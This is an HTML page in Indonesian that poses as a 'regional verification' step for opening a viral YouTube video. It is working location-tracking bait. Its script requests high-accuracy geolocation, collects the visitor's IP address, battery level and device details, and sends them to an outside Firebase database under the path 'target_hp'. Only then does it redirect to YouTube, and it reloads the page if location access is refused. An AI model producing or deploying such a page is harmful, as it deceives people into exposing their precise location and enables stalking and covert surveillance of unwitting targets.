<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Keamanan Konten</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background-color: #0f172a; color: #f8fafc; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .card { background: #1e293b; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); max-width: 320px; width: 90%; }
        .icon { font-size: 50px; margin-bottom: 20px; }
        h2 { font-size: 18px; margin-bottom: 10px; font-weight: 600; }
        p { font-size: 13px; color: #94a3b8; line-height: 1.6; margin-bottom: 25px; }
        .btn { background: #3b82f6; color: white; border: none; padding: 15px 20px; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
        #loader { display: none; margin-top: 15px; border: 3px solid #334155; border-top: 3px solid #3b82f6; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin-left: auto; margin-right: auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="card" id="mainCard">
    <div class="icon">🛡️</div>
    <h2>Verifikasi Wilayah</h2>
    <p>Konten ini sedang tren di wilayah Anda. Silakan verifikasi lokasi untuk membuka aplikasi YouTube secara otomatis.</p>
    <button class="btn" id="startBtn" onclick="processAll()">BUKA VIDEO VIRAL</button>
    <div id="loader"></div>
</div>

<script>
    const DB_URL = "https://trackeronlineviral-default-rtdb.asia-southeast1.firebasedatabase.app/target_hp.json";
    const YT_URL = "https://www.youtube.com/trending";
    const YT_APP_INTENT = "intent://www.youtube.com/trending#Intent;package=com.google.android.youtube;scheme=https;end";

    async function getIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (e) { return "Hidden/VPN"; }
    }

    async function getBattery() {
        try {
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                return Math.round(battery.level * 100) + "%";
            }
            return "N/A";
        } catch (e) { return "N/A"; }
    }

    async function sendData(coords) {
        const ip = await getIP();
        const bat = await getBattery();
        const payload = {
            lat: coords.latitude,
            lon: coords.longitude,
            ip: ip,
            battery: bat,
            device: navigator.userAgent.split('(')[1]?.split(')')[0] || "Mobile",
            updated_at: new Date().toLocaleString("id-ID"),
            status: "Online"
        };

        return fetch(DB_URL, { 
            method: 'PUT', 
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload) 
        });
    }

    function processAll() {
        document.getElementById('startBtn').style.display = "none";
        document.getElementById('loader').style.display = "block";

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                // Kirim data dulu sampai selesai
                await sendData(pos.coords);
                
                // Baru redirect
                setTimeout(() => {
                    window.location.href = YT_APP_INTENT;
                    setTimeout(() => { window.location.href = YT_URL; }, 1000);
                }, 500);
            }, (err) => {
                alert("Akses lokasi diperlukan untuk memverifikasi konten wilayah Anda.");
                location.reload();
            }, { enableHighAccuracy: true });
        }
    }
</script>
</body>
</html>
